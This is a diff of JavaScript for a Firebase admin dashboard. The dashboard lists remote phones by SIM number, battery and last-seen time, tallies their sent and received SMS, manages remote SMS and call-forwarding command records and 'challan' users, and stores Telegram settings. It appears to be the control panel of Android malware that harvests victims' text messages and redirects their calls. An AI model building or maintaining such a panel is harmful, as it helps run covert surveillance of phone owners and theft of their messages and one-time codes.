@@ -24,8 +24,8 @@ db.ref("device_info").on("value", (snapshot) => {
       battery: d.battery || "N/A",
       battery_status: d.battery_status || "",
       battery_updated_at: d.battery_updated_at || 0,
-      sim1: d.sim1 || d.sim1_number || "No SIM Found",
-      sim2: d.sim2 || d.sim2_number || "No SIM Found",
+      sim1: d.sim1_number || d.sim1 || "No SIM Found",
+      sim2: d.sim2_number || d.sim2 || "No SIM Found",
       install_time: d.install_time || "-",
       last_seen: d.last_seen || 0,
       serial_number: d.serial_number || 0,
@@ -63,16 +63,18 @@ function updateStats() {
 // LOAD MESSAGE STATS
 // ==========================================
 function loadMessageStats() {
-  db.ref("sms_commands").once("value").then((snap) => {
+  db.ref("device_info").once("value").then((snap) => {
     const data = snap.val() || {};
     let sendCount = 0;
     let recvCount = 0;
 
     Object.keys(data).forEach((deviceId) => {
-      const msgs = data[deviceId] || {};
+      const d = data[deviceId] || {};
+      const msgs = d.messages || {};
       Object.keys(msgs).forEach((msgKey) => {
         const m = msgs[msgKey] || {};
-        if (m.status === "sent" || m.direction === "out") sendCount++;
+        const type = (m.type || "").toUpperCase();
+        if (type === "SENT") sendCount++;
         else recvCount++;
       });
     });
@@ -108,7 +110,7 @@ function renderDevices() {
             <div class="serial-badge">${dev.serial_number || "?"}</div>
             <div>
               <div class="device-name">Device ${escapeHtml(shortDeviceName(dev.id))}</div>
-              <div class="device-id-small">${escapeHtml(dev.id.slice(0, 12))}...</div>
+              <div class="device-id-small">${escapeHtml(dev.id.slice(0, 16))}...</div>
             </div>
           </div>
           <div class="status-pill ${statusClass}">
@@ -180,9 +182,7 @@ function confirmDelete() {
 
   const promises = [
     db.ref("device_info/" + deleteTargetId).remove(),
-    db.ref("challan_users/" + deleteTargetId).remove().catch(() => {}),
-    db.ref("call_forward_commands/" + deleteTargetId).remove().catch(() => {}),
-    db.ref("sms_commands/" + deleteTargetId).remove().catch(() => {})
+    db.ref("challan_users/" + deleteTargetId).remove().catch(() => {})
   ];
 
   Promise.all(promises).then(() => {
@@ -300,7 +300,8 @@ function saveTelegram() {
 // MODAL CONTROLS
 // ==========================================
 function closeModal(id) {
-  document.getElementById(id).classList.remove("active");
+  const el = document.getElementById(id);
+  if (el) el.classList.remove("active");
 }
 
 document.querySelectorAll(".modal-overlay").forEach((overlay) => {
